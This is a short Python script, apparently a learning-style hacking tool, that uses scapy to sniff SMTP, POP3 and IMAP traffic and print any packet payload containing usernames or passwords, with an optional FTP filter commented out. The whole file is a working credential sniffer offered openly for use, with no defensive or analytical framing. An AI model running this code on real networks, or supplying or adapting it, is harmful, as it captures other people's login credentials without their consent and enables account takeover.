"""
 a simple mailing sniffing client using scapy
 it captures SMTP, POP3 and IMAP credentials

"""
from scapy.all import sniff, TCP, IP

# The packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        my_packet = str(packet[TCP].payload)
        if 'user' in my_packet.lower() or 'pass' in my_packet.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # The filter can be change to sniff at the moment it focuses on mail server ports FTP port 21
    # store 0 makes sure scapy doesn't keep the packets in memory.
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)

    # sniff ftp example
    # sniff(filter='tcp port 21', store=0)

if __name__ == '__main__':
    main()